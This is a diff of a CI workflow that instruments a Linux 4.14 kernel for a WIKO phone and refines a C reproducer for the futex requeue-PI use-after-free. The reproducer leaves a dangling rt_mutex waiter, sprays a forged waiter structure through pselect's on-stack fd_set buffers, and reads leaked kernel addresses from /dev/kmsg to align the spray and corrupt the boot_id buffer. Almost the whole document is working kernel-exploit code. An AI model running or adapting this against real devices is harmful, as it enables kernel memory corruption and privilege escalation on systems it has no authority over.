@@ -33,39 +33,53 @@ jobs:
       - name: Instrument kernel (anchors + ghost delta)
         run: |
           python3 << 'PYEOF'
-          # 1) globalize boot_id buffer in kernel/sysctl.c + add scratch + prints
-          s = open('linux-g/kernel/sysctl.c').read()
+          # 1) globalize boot_id buffer（stock 4.14.186 在 kernel/random.c，
+          #    变量名 sysctl_bootid —— WIKO System.map 同名实锤）+ 加 scratch
           boot_name = None
-          if 'static unsigned char sysctl_bootid' in s:
-              boot_name = 'sysctl_bootid'
-          elif 'static unsigned char boot_id' in s:
-              boot_name = 'boot_id'
+          target_file = None
+          for fn in ('linux-g/kernel/random.c', 'linux-g/kernel/sysctl.c'):
+              s = open(fn).read()
+              for cand in ('sysctl_bootid', 'boot_id'):
+                  if ('static unsigned char %s' % cand) in s:
+                      boot_name = cand
+                      target_file = fn
+                      s = s.replace('static unsigned char %s' % cand,
+                                    'unsigned char ghostlock_bootid_%s' % cand)
+                      s = s.replace('&%s' % cand, '&ghostlock_bootid_%s' % cand)
+                      open(fn, 'w').write(s)
+                      break
+              if boot_name:
+                  break
           assert boot_name, 'boot_id buffer not found'
-          s = s.replace('static unsigned char %s' % boot_name,
-                        'unsigned char ghostlock_bootid_%s' % boot_name)
-          s = s.replace('&%s' % boot_name, '&ghostlock_bootid_%s' % boot_name)
-          s = s.replace('#include <linux/kernel.h>',
-                        '#include <linux/kernel.h>\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));')
-          open('linux-g/kernel/sysctl.c','w').write(s)
-          print('sysctl.c patched, boot buffer:', boot_name)
+          # 在 random.c 里加 scratch 全局（插到第一个 #include 之后）
+          s = open('linux-g/kernel/random.c').read()
+          if 'ghostlock_scratch' not in s:
+              idx = s.find('#include')
+              assert idx >= 0, 'no include in random.c'
+              eol = s.find('\n', idx)
+              s = s[:eol+1] + '\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));\n' + s[eol+1:]
+              open('linux-g/kernel/random.c', 'w').write(s)
+          print('boot buffer:', boot_name, 'in', target_file)
 
           # 2) ghost delta prints: futex_wait_requeue_pi q.waiter
           f = open('linux-g/kernel/futex.c').read()
-          needle = 'struct futex_q q;'
-          if needle in f:
-              f = f.replace(needle, needle + '\n\tpr_info("DBG q_waiter=%px\\n", &q.waiter);', 1)
+          for needle in ('struct futex_q q = futex_q_init;', 'struct futex_q q;'):
+              if needle in f:
+                  f = f.replace(needle, needle + '\n\tpr_info("DBG q_waiter=%px\\n", &q.waiter);', 1)
+                  print('futex.c q_waiter print OK:', needle)
+                  break
+          else:
+              print('futex.c q_waiter print WARN: needle missing')
           open('linux-g/kernel/futex.c','w').write(f)
-          print('futex.c q_waiter print:', 'OK' if needle in f else 'WARN')
 
           # 3) stack_fds print in fs/select.c core_sys_select
           g = open('linux-g/fs/select.c').read()
-          if 'unsigned long stack_fds' in g:
-              g = g.replace('unsigned long stack_fds',
-                            'unsigned long stack_fds', 1)
-              g = g.replace('fds.in      = (unsigned long *)stack_fds;',
-                            'pr_info("DBG stack_fds=%px\\n", stack_fds);\n\tfds.in      = (unsigned long *)stack_fds;', 1)
-          open('linux-g/fs/select.c','w').write(g)
-          print('select.c stack_fds print:', 'OK' if 'DBG stack_fds' in g else 'WARN')
+          done = False
+          decl = 'long stack_fds[SELECT_STACK_ALLOC/sizeof(long)];'
+          if decl in g:
+              g = g.replace(decl, decl + '\n\tpr_info("DBG stack_fds=%px\\n", stack_fds);', 1)
+              done = True
+          print('select.c stack_fds print:', 'OK' if done else 'WARN')
 
           # 4) proxy lock + requeue markers (keep v9 instrumentation)
           reps = [
@@ -138,12 +152,11 @@ jobs:
                             const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
             return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
           }
-          static uint32_t f_wait, f_pi_target, f_pi_chain;
+          static uint32_t f_wait[8], f_pi_target[8], f_pi_chain[8];
           static volatile int owner_has_target, waiter_has_chain, waiter_waiting,
-                             owner_started, requeue_done, route_done, owner_chain_done,
+                             owner_started, route_done, owner_chain_done,
                              ghost_go, consumer_done;
-          static volatile int waiter_tid;
-          static int word_shift = 0;
+          static volatile int waiter_tid, word_shift, dance_idx;
 
           static void read_bootid(unsigned char out[16]) {
             int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
@@ -167,7 +180,7 @@ jobs:
             attr.sched_policy = SCHED_NORMAL;
             attr.sched_nice = 1;
             long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
-            printf("REPRO consumer sched_setattr tid=%d ret=%ld errno=%d\n", waiter_tid, r, errno);
+            printf("REPRO consumer sched_setattr tid=%d ret=%ld errno=%d idx=%d\n", waiter_tid, r, errno, dance_idx);
             consumer_done = 1;
             return NULL;
           }
@@ -182,7 +195,7 @@ jobs:
             fd_set in, out, ex;
             FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
             unsigned long *bits;
-            /* global word layout (WIKO rt_mutex_waiter 80B):
+            /* WIKO rt_mutex_waiter 80B 布局（pahole）：
                0 tree_pc(comm) 1 tree_right(0) 2 tree_left(bootid)
                3 pi_pc(comm) 4 pi_right(0) 5 pi_left(bootid)
                6 task(init) 7 lock(scratch) 8 prio(130) 9 deadline(0) */
@@ -206,41 +219,93 @@ jobs:
             dup2(high_read, 319);
             FD_SET(319, &ex);
             struct timespec ts = { .tv_sec = 3, .tv_nsec = 0 };
-            printf("REPRO pselect enter shift=%d pid=%d\n", word_shift, getpid());
+            printf("REPRO pselect enter shift=%d idx=%d\n", word_shift, dance_idx);
             ghost_go = 1;
             int r = pselect(320, &in, &out, &ex, &ts, NULL);
             printf("REPRO pselect ret=%d errno=%d shift=%d\n", r, errno, word_shift);
           }
 
           static void *waiter_fn(void *a) {
+            int idx = dance_idx;
             waiter_tid = (int)syscall(SYS_gettid);
-            long r = futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-            printf("REPRO waiter LOCK_PI chain ret=%ld errno=%d\n", r, errno);
+            long r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO waiter LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
             __sync_synchronize(); waiter_has_chain = 1;
             while (!owner_has_target) usleep(1000);
             struct timespec ts = { .tv_sec = 10 };
             __sync_synchronize(); waiter_waiting = 1;
-            r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
-            printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d\n", r, errno);
+            r = futex(&f_wait[idx], FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target[idx], 0);
+            printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
             do_ghost_pselect();
             __sync_synchronize(); route_done = 1;
-            r = futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-            printf("REPRO waiter UNLOCK_PI ret=%ld errno=%d\n", r, errno);
+            r = futex(&f_pi_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO waiter UNLOCK_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
             while (!owner_chain_done) usleep(1000);
+            for (;;) sleep(60);   /* 永不退出：dangling pi_blocked_on 活着 */
             return NULL;
           }
 
           static void *owner_fn(void *a) {
-            long r = futex(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-            printf("REPRO owner LOCK_PI target ret=%ld errno=%d\n", r, errno);
+            int idx = dance_idx;
+            long r = futex(&f_pi_target[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO owner LOCK_PI target ret=%ld errno=%d idx=%d\n", r, errno, idx);
             __sync_synchronize(); owner_has_target = 1;
             while (!waiter_has_chain) usleep(1000);
             __sync_synchronize(); owner_started = 1;
-            r = futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-            printf("REPRO owner LOCK_PI chain ret=%ld errno=%d\n", r, errno);
+            r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+            printf("REPRO owner LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
             __sync_synchronize(); owner_chain_done = 1;
-            sleep(60);
+            for (;;) sleep(60);
             return NULL;
+          }
+
+          static long run_dance(int idx, int shift) {
+            word_shift = shift;
+            dance_idx = idx;
+            owner_has_target = waiter_has_chain = waiter_waiting = 0;
+            owner_started = route_done = owner_chain_done = 0;
+            ghost_go = consumer_done = 0;
+            pthread_t o, w, c;
+            pthread_create(&o, NULL, owner_fn, NULL);
+            usleep(200000);
+            pthread_create(&w, NULL, waiter_fn, NULL);
+            pthread_create(&c, NULL, consumer_fn, NULL);
+            while (!waiter_waiting || !owner_started) usleep(1000);
+            usleep(100000);
+            long rq = -1; int edeadlk = 0;
+            for (int i = 1; i <= 3; i++) {
+              errno = 0;
+              rq = futex(&f_wait[idx], FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target[idx], 0);
+              printf("REPRO try=%d CMP_REQUEUE_PI ret=%ld errno=%d idx=%d\n", i, rq, errno, idx);
+              if (errno == 35) { edeadlk = 1; break; }
+              if (rq >= 1) break;
+              sleep(1);
+            }
+            while (!route_done) usleep(10000);
+            sleep(1);
+            return edeadlk ? 35 : rq;
+          }
+
+          static void find_delta(unsigned long *qwaiter, unsigned long *sfds) {
+            *qwaiter = *sfds = 0;
+            int fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
+            if (fd < 0) { printf("REPRO kmsg open failed errno=%d\n", errno); return; }
+            char buf[262144];
+            ssize_t n = read(fd, buf, sizeof(buf)-1);
+            close(fd);
+            if (n <= 0) { printf("REPRO kmsg read n=%zd\n", n); return; }
+            buf[n] = 0;
+            char *p = buf;
+            while ((p = strstr(p, "DBG q_waiter=")) != NULL) {
+              *qwaiter = strtoull(p + 13, NULL, 16);
+              p += 13;
+            }
+            p = buf;
+            while ((p = strstr(p, "DBG stack_fds=")) != NULL) {
+              *sfds = strtoull(p + 14, NULL, 16);
+              p += 14;
+            }
+            printf("REPRO delta parse q_waiter=%016lx stack_fds=%016lx\n", *qwaiter, *sfds);
           }
 
           int main(void) {
@@ -249,23 +314,25 @@ jobs:
             printf("REPRO bootid before: %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
                    before[0],before[1],before[2],before[3],before[4],before[5],before[6],before[7],
                    before[8],before[9],before[10],before[11],before[12],before[13],before[14],before[15]);
-            pthread_t o, w, c;
-            pthread_create(&o, NULL, owner_fn, NULL);
-            usleep(200000);
-            pthread_create(&w, NULL, waiter_fn, NULL);
-            pthread_create(&c, NULL, consumer_fn, NULL);
-            while (!waiter_waiting || !owner_started) usleep(1000);
-            usleep(100000);
-            long rq = -1;
-            for (int i = 1; i <= 3; i++) {
-              errno = 0;
-              rq = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
-              printf("REPRO try=%d CMP_REQUEUE_PI ret=%ld errno=%d f_wait=%u\n", i, rq, errno, f_wait);
-              if (errno == 35 || rq >= 1) break;
-              sleep(1);
+
+            printf("REPRO dance1 shift=0\n");
+            run_dance(0, 0);
+
+            unsigned long qwaiter = 0, sfds = 0;
+            find_delta(&qwaiter, &sfds);
+            int shift = -1;
+            if (qwaiter && sfds) {
+              long d = (long)(qwaiter - sfds);
+              printf("REPRO raw delta=%ld\n", d);
+              if (d >= 0 && (d % 8) == 0 && (d / 8) < 40)
+                shift = (int)(d / 8);
             }
-            while (!route_done) usleep(10000);
-            sleep(1);
+            printf("REPRO computed shift=%d\n", shift);
+            if (shift < 0) shift = 0;
+
+            printf("REPRO dance2 shift=%d\n", shift);
+            run_dance(1, shift);
+
             read_bootid(after);
             printf("REPRO bootid after:  %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
                    after[0],after[1],after[2],after[3],after[4],after[5],after[6],after[7],
